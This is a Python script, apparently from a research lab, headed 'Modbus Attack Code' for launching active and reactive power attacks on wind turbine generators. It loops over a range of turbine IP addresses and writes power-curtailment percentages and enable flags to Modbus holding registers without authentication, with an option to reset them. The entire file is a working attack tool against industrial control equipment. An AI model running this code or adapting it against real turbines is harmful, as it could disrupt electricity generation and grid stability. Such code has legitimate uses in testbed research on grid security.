#!/usr/bin/python
# Python code to launch active and reactive power attacks on WTGs
# Comments to jjohns2@sandia.gov

from pymodbus.client.sync import ModbusTcpClient as ModbusClient
import argparse 
import struct
import time

parser = argparse.ArgumentParser(description = "Modbus Attack Code")
parser.add_argument('-type', help='Type of attack "P" or "Q"', default="P", type=str)
parser.add_argument('-wtg_start', '--ip_start', dest='ip_start', default=1, type=int)
parser.add_argument('-wtg_end', '--ip_stop', dest='ip_stop', default=30, type=int)
parser.add_argument('-t', '--target_value', dest='value', default=20, type=int)
parser.add_argument('-clean', '--reset', dest='reset', default=False, type=bool)
parser.add_argument('-read', dest='read', default=False, type=bool)
args = parser.parse_args()

def get_powers(wtg):
	try:
		power = wtg.read_holding_registers(40084).registers[0]
		power_sf = wtg.read_holding_registers(40085).registers[0] # - (2**16)
		q = wtg.read_holding_registers(40090).registers[0]
		q_sf = wtg.read_holding_registers(40091).registers[0] # - (2**16)
		# print('power = %s, power_sf = %s, q = %s, q_sf = %s' % (power, power_sf, q, q_sf))
		print('Current P = %0.2f W, Q = %0.2f VAr' % (power * (10 ** power_sf), q * (10 ** q_sf)))
	except Exception as e:
		print('Error getting power data. %s' % e)


def attack():
	ip_start = args.ip_start
	ip_stop = args.ip_stop
	target_pct = args.value * 100  # target value for active and reactive power
	if args.type == None:
		args.type = 'P'
	
	if args.reset:
		reg_ena_value = 0
		if args.type == 'P':
			target_pct = 100 * 100  # set back to full output power
		else:
			target_pct = 0  # return to no reactice power 
	else:
		reg_ena_value = 1

	for wtg_last_octet in range(ip_start, ip_stop+1, 1):
		# print('Connecting to WTG at 192.168.100.%d' % wtg_last_octet)
		try:
			wtg = ModbusClient('192.168.100.%d' % wtg_last_octet, 502)
			wtg.connect()
			print('Connected to WTG at 192.168.100.%d' % wtg_last_octet)
		except Exception as e:
			print('Connection Fail to WTG at 192.168.100.%d\n%s' % (wtg_last_octet, e))
			continue
		
		get_powers(wtg)
		if args.read:
			continue
		
		if args.type == 'P':
			reg_pct = 40155
			reg_ena = 40159
		else:  # Q
			reg_pct = 40166
			reg_ena = 40172
		
		# Read and print current values
		w_pct_rsp = wtg.read_holding_registers(reg_pct, count=1, unit=1)
		#print(w_pct_rsp)
		if not w_pct_rsp.isError():
			w_pct = float(w_pct_rsp.registers[0]/100)
		else:
			w_pct = 'NoRead'
		w_pct_ena_rsp = wtg.read_holding_registers(reg_ena)
		if not w_pct_ena_rsp.isError():
			w_pct_ena = w_pct_ena_rsp.registers[0]
		else:
			w_pct_ena = 'NoRead'
		print('Current Settings are Power%% = %s, Enabled = %s' % (w_pct, w_pct_ena))
		
		print('Writing WTG Power = %s%% [Raw = %s]' % (target_pct/100, target_pct))
		rsp = wtg.write_registers(reg_pct, target_pct)
		rsp2 = wtg.write_registers(reg_ena, reg_ena_value)
		print('Write complete. Success? %s and %s' % (not rsp.isError(), not rsp2.isError()))
		
		# Read and print current values
		w_pct_rsp = wtg.read_holding_registers(reg_pct, count=1, unit=1)
		#print(w_pct_rsp)
		if not w_pct_rsp.isError():
			w_pct = float(w_pct_rsp.registers[0]/100)
		else:
			w_pct = 'NoRead'
		w_pct_ena_rsp = wtg.read_holding_registers(reg_ena)
		if not w_pct_ena_rsp.isError():
			w_pct_ena = w_pct_ena_rsp.registers[0]
		else:
			w_pct_ena = 'NoRead'
		print('Current Settings are Power%% = %s, Enabled = %s' % (w_pct, w_pct_ena))
		
		time.sleep(1) 
		get_powers(wtg)
		
		wtg.close()
		
if __name__ == "__main__":
	attack()

